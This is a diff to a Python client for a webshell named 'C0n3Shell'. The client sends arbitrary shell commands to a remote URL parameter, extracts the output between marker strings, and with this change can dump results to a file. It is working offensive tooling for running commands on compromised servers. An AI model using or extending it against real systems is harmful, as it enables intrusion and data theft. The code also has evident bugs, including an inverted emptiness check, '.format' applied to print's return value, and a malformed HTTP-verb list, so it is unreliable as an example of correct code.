@@ -1,3 +1,4 @@
+from datetime import datetime
 import requests
 from urllib.parse import quote
 from lxml import html
@@ -14,6 +15,7 @@ BANNER = """\033[01;32m\n
 
 
 class C0n3Shell(Cmd):
+    _last_result = ''
 
     _headers = None
     _data = None
@@ -78,7 +80,8 @@ class C0n3Shell(Cmd):
             else:
                 print('[!] Unknown {}'.format(internal_command_handler))
         else:
-            print(self.sendToShell(cmd))
+            self._last_result=self.sendToShell(cmd)
+            print(self._last_result)
 
     # Send command to webshell and display results
     def sendToShell(self, cmd):
@@ -88,17 +91,14 @@ class C0n3Shell(Cmd):
             if self._options['show_stderr']:
                 payload = '{} 2>&1'.format(payload)
             if not self._options['raw']:
-                payload = 'echo \'{}\';{};echo \'{}\''.format(
-                    self._options['marker'], payload, self._options['marker'])
+                payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'], payload, self._options['marker'])
 
             print('[!] Sending payload: {}'.format(payload))
             response = requests.request(
                 self._options['http_verb'],
-                '{}?{}={}'.format(
-                    self._options['url'], self._options['attribute'], quote(payload)),
+                '{}?{}={}'.format(self._options['url'], self._options['attribute'], quote(payload)),
                 headers=self._headers,
-                data=self._data if self._options['http_verb'] in [
-                    'post,put'] else None
+                data=self._data if self._options['http_verb'] in ['post,put'] else None
             )
 
             if response.status_code == 200:
@@ -108,16 +108,13 @@ class C0n3Shell(Cmd):
                     result = response.text
                     try:
                         if result != None and len(result) > 0:
-                            result = result[result.find(
-                                self._options['marker']) + len(self._options['marker']) + 1:]
-                            result = result[:result.rfind(
-                                self._options['marker'])]
+                            result = result[result.find(self._options['marker']) + len(self._options['marker']) + 1:]
+                            result = result[:result.rfind(self._options['marker'])]
                         return result
                     except:
                         return response.text
             else:
-                print('[!] Receive http code {}: {}').format(
-                    response.status_code, response.text)
+                print('[!] Receive http code {}: {}').format(response.status_code, response.text)
 
         except Exception as ex:
             print('[!] Error: {}'.format(ex))
@@ -145,6 +142,17 @@ class C0n3Shell(Cmd):
 
         self.updatePrompt()
 
+    def dumpLastResult(self,args):
+        if self._last_result == None and len(self._last_result) <= 0:
+            print('[!] Last result empty, nothing to dump')
+            return
+
+        outputfile = './dump-{}.txt'.format(datetime.now())
+        with open(outputfile,'w+') as of:
+            of.write(self._last_result)
+            of.close()
+        print('[!] Last result saved in {}'.format(outputfile))
+
     def quitCmd(self, args):
         quit()
 
@@ -152,6 +160,7 @@ class C0n3Shell(Cmd):
         print('[?] Help: ')
 
     _internal_commands = {
+        'dump': dumpLastResult,
         'help': helpCmd,
         'h': helpCmd,
         '?': helpCmd,
